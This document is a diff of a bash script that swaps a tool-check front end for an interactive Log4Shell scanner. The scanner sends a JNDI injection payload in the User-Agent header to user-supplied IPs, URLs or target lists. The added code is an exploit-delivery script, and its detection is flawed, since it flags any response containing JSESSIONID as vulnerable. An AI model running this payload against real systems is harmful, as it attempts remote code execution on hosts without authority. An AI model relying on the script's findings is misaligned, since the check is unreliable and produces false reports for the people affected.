@@ -11,64 +11,51 @@
 
 
 
-doesCommandExist () {
-  if ! command -v $1 >/dev/null 2>&1 ; then
-    echo "Please install $1"
-    return 1
-  fi
-}
+# Color codes
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No Color
 
-domainScan-DoesCommandExistReqText() {
-  echo "The following tools are required for domain scan:"
-}
+# Prompt for input type
+echo -e "${YELLOW}Enter 'ip', 'url', or 'file' to specify the target:${NC}"
+read input_type
 
-listScan-DoesCommandExistReqText() {
-  echo "The following tools are required for list scan:"
-}
+# The target(s)
+targets=()
 
-domainScan-DoesCommandExistReqExit() {
-  if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "assetfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "subfinder" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "amass" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
-    doesCommandExistReqMoreInfo
+# Process based on the input type
+if [ "$input_type" = "ip" ] || [ "$input_type" = "url" ]; then
+    echo -e "${YELLOW}Enter the ${input_type}:${NC}"
+    read target
+    targets+=("$target")
+elif [ "$input_type" = "file" ]; then
+    echo -e "${YELLOW}Enter the full path to the file:${NC}"
+    read file_path
+    while IFS= read -r line; do
+        targets+=("$line")
+    done < "$file_path"
+else
+    echo -e "${RED}Invalid option. Please enter 'ip', 'url', or 'file'.${NC}"
     exit 1
-  fi
-}
+fi
 
-listScan-DoesCommandExistReqExit() {
-  if [[ $(command -v "curl" >/dev/null 2>&1 ; echo $?) -ne 0 || $(command -v "httpx" >/dev/null 2>&1 ; echo $?) -ne 0 ]]; then
-    doesCommandExistReqMoreInfo
-    exit 1
-  fi
-}
+# The payload
+payload='${jndi:ldap://localhost:1389/Exploit}'
 
-doesCommandExistReqMoreInfo() {
-  echo "You can install the required tools from here:"
-  echo "  - curl: https://curl.se/download.html"
-  echo "  - httpx: https://github.com/projectdiscovery/httpx#installation"
-  echo "  - assetfinder: https://github.com/tomnomnom/assetfinder#install"
-  echo "  - subfinder: https://github.com/projectdiscovery/subfinder#installation"
-  echo "  - amass: https://github.com/OWASP/Amass#installation"
-}
+# Scan each target
+for target in "${targets[@]}"; do
+    echo -e "${YELLOW}Checking ${target}...${NC}"
 
-while getopts "d:l:b:" OPTION
-do
-  case $OPTION in
-    d)
-      DOMAIN=$OPTARG
-      domainScan-DoesCommandExistReqText
-      domainScan-DoesCommandExistReqExit
-      ;;
-    l)
-      LIST=$OPTARG
-      listScan-DoesCommandExistReqText
-      listScan-DoesCommandExistReqExit
-      ;;
-    b)
-      BURP=$OPTARG
-      ;;
-  esac
+    # Using curl to send the payload and check the response
+    response=$(curl -s -H "User-Agent: $payload" "$target")
+
+    # Check the response for JSESSIONID which might indicate a Log4j-enabled server
+    if [[ "$response" == *"JSESSIONID"* ]]; then
+        echo -e "${RED}Potential vulnerability detected at ${target}${NC}"
+    else
+        echo -e "${GREEN}${target} seems not to be vulnerable${NC}"
+    fi
 done
 
-if [[ -z $DOMAIN && -z $LIST || -z $BURP ]]; then
-  echo "Please provide a domain (-d) or a URL list (-l) and a burp collaborator ID (-b)"
-  doesCommandExistReqMoreInfo
-fi
+echo -e "${GREEN}Scan completed.${NC}"
